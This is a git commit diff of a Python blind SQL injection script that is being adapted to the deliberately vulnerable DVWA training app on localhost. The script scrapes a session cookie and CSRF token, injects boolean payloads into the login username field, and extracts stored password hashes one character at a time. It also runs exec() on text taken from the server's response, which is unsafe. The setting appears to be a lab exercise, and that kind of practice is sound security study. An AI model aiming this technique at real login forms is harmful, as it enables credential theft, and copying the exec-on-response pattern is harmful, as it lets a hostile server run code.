6c66ac59c11728d921aef74a741c361e08fdab36
bbgx <bernardo_bugmann@protonmail.com>
2022-09-14 22:32:37 -0700

    Change queries to match DVWA project

--- sql-inject.py
+++ sql-inject.py
@@ -1,28 +1,54 @@
 import requests
+import re
 
 total_queries = 0
-charset = "0123456789abcdefghijklmnopqrstuvwxyz"
-target = "http://127.0.0.1:3000/login"
-needle =  "Go back to login"
+charset = "0123456789abcdef"
+target = "http://localhost/login.php"
+needle =  "Welcome to Damn Vulnerable Web Application!"
 
 def injected_query(payload):
 	global total_queries
-	r = requests.post(target, data = {"username" : "admin' and {}--".format(payload), "password": "password"})
+
+	r = requests.get(target)
+
+	phpsessid = r.cookies.get('PHPSESSID')
+
+	user_token_html = [x for x in r.text.split('\n') if 'user_token' in x]
+	user_token = [x for x in user_token_html[0].split(' ') if 'value' in x]
+	value=''
+	exec(user_token[0])
+
+	cookies_json = {
+		'PHPSESSID': phpsessid,
+		'security': 'low'
+	}
+	cookies_json = {
+    	'PHPSESSID': phpsessid,
+    	'security': 'low'
+	}
+	r = requests.post(target, data = {
+		"username": "admin' and {}--".format(payload), 
+		"password": "password",
+		"Login": "Login",
+		"user_token": value
+	},
+	cookies=cookies_json)
 	total_queries += 1
+
 	return needle.encode() not in r.content
 
 def boolean_query(offset, user_id, character, operator=">"):
-	payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset+1, user_id, operator, character)
+	payload = "(select hex(substr(password,{},1)) from users where user_id = {}) {} hex('{}')".format(offset+1, user_id, operator, character)
 	return injected_query(payload)
 
 def invalid_user(user_id):
-	payload = "(select id from user where id = {}) >= 0".format(user_id)
+	payload = "(select user_id from users where user_id = {}) >= 0".format(user_id)
 	return injected_query(payload)
 
 def password_lenght(user_id):
 	lenght = 0
 	while True:
-		payload = "(select lenght(password) from user where id = {} and lenght(password) <= {} limit 1)".format(user_id, lenght)
+		payload = "(select CHAR_LENGTH(password) from users where user_id = {} and CHAR_LENGTH(password) <= {} limit 1)".format(user_id, lenght)
 		if not injected_query(payload):
 			return lenght
 		lenght += 1
